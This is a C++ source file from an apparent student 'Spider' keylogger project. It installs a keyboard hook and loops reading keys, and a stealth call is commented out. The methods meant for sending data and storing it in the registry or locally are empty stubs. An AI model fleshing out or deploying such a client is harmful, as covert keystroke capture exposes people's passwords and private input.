//
// Core.cpp for Spider client in /home/touzet_t/epitech/cpp/cpp_spider/client
// 
// Made by Theo TOUZET
// Login   <touzet_t@epitech.net>
// 
// Started on  Tue Nov  1 13:50:03 2016 Theo TOUZET
// Last update Tue Nov  1 13:50:10 2016 Theo TOUZET
//

#include "Core.hh"

Core::Core()
{

}

Core::~Core()
{
}

int	Core::sendData(const std::string &msg)
{
	return (0);
}

int	Core::storeInReg(const std::string &msg)
{
	return (0);
}

int	Core::storeLocally(const std::string &msg)
{
	return (0);
}

int	Core::run()
{
	bool Continue = true;

	if (keylog.installhook() == false)
		Continue = false;
	//keylog.stealth();


	while (Continue)
	{
		keylog.getKey();
	}
	return (0);
}

/* LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	CHAR szBuf[128];
	HDC hdc;
	static int c = 0;
	size_t cch;
	HRESULT hResult;

	if (nCode < 0)  // do not process message 
		return CallNextHookEx(myhookdata[IDM_KEYBOARD].hhook, nCode,
			wParam, lParam);

	hdc = GetDC(gh_hwndMain);
	hResult = StringCchPrintf(szBuf, 128 / sizeof(TCHAR), "KEYBOARD - nCode: %d, vk: %d, %d times ", nCode, wParam, c++);
	if (FAILED(hResult))
	{
		// TODO: write error handler
	}
	hResult = StringCchLength(szBuf, 128 / sizeof(TCHAR), &cch);
	if (FAILED(hResult))
	{
		// TODO: write error handler
	}
	TextOut(hdc, 2, 115, szBuf, cch);
	ReleaseDC(gh_hwndMain, hdc);

	return CallNextHookEx(myhookdata[IDM_KEYBOARD].hhook, nCode, wParam, lParam);
} */